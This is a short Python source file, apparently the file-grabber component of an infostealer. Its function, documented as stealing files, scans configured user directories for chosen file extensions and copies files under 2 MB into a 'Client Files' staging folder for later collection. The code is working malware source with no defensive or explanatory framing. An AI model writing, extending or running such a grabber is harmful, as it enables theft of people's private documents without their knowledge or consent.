import os
import shutil
from pathlib import Path
# 


def file_grabber_fun(kingFolder: str, file_grabber_config: dict[dict[str, list[str] | str]]) -> None:
    """this function steall files"""


    folder_path: str = os.path.join(kingFolder, "Client Files")
    for names_dir, path_dir in file_grabber_config.get("DIR_PATHS").items():
        path_dir: str = os.path.expandvars(path_dir)
        if not os.path.exists(path_dir):
            continue
        for file_name in os.listdir(path_dir):
            for extantion in file_grabber_config.get("FILE_EXTANTANTION"):
                all_file_path: str = os.path.join(path_dir, file_name)
                if not os.path.isfile(all_file_path):
                    continue
                if Path(all_file_path).suffix.lower() == extantion and os.path.getsize(all_file_path) <= 2*1024*1024:
                    os.makedirs(os.path.join(folder_path, names_dir, extantion), exist_ok=True)
                    try:
                        shutil.copy2(all_file_path, os.path.join(folder_path, names_dir, extantion, file_name))
                    except Exception as err:
                        print(err) 